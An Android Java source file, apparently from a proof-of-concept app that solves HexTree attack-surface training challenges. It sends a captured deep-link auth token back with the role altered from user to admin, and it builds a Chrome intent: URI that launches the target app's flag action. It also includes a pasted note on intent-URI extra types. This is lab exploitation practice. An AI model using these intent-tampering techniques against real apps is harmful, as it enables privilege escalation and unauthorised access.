package com.poc.hextree;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class DeepLinkActivity extends AppCompatActivity {
    public String packageName = "io.hextree.attacksurface";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_deep_link);

        Intent intent = getIntent();
        Log.i("deeplink intent", Utils.dumpIntent(this,intent));
        Utils.showDialog(this,intent);

        Uri data = intent.getData();
        Log.i("data", String.valueOf(data));
// extract values for the gotten intent and update them then send them to app. I was too busy to do this
        String solution = "hex://token??authToken=598cc075e4379d027f61c02866917c6f1d992c67&type=admin&authChallenge=89bfa7ac-98f8-47c7-ac51-1c482875b0b4";
//        hex://token?authToken=598cc075e4379d027f61c02866917c6f1d992c67&type=user&authChallenge=89bfa7ac-98f8-47c7-ac51-1c482875b0b4

        Intent intent2 = new Intent("android.intent.action.VIEW");
        intent2.setData(Uri.parse(solution));
        intent2.setClassName(packageName,packageName+".activities.Flag14Activity");
        startActivity(intent2);
    }

    private void flag15Solution(){
        // the goal here is to understand chromes intent uri scheme that opens app
        // required to craft a uri with all intent specific data
        // below is the correct scheme technique
        String uri = "intent:#Intent;package=io.hextree.attacksurface;action=io.hextree.action.GIVE_FLAG;category=android.intent.category.BROWSABLE;B.flag=true;S.action=flag;S.com.android.browser.application_id=io.hextree.attacksurface;end;\n";

/**  from chatgpt  Common Type Indicators in Intent URIs
 S: String Extra

 Adds a string extra.
 Example: S.key=value
 Adds an extra with key key and value "value".
 B: Boolean Extra

 Adds a boolean extra.
 Example: B.key=true
 Adds an extra with key key and value true.
 I: Integer Extra

 Adds an integer extra.
 Example: I.key=42
 Adds an extra with key key and value 42.
 J: Long Extra

 Adds a long integer extra.
 Example: J.key=1234567890
 Adds an extra with key key and value 1234567890.
 F: Float Extra

 Adds a float extra.
 Example: F.key=3.14
 Adds an extra with key key and value 3.14.
 D: Double Extra

 Adds a double extra.
 Example: D.key=2.71828
 Adds an extra with key key and value 2.71828.
 C: Character Extra

 Adds a character extra.
 Example: C.key=a
 Adds an extra with key key and value 'a'.
 P: Parcelable Extra

 Adds a Parcelable object as an extra. Rarely used in intent URIs because it's more complex and usually handled programmatically.
 Example: P.key=<parcelable>
 **/

    }
}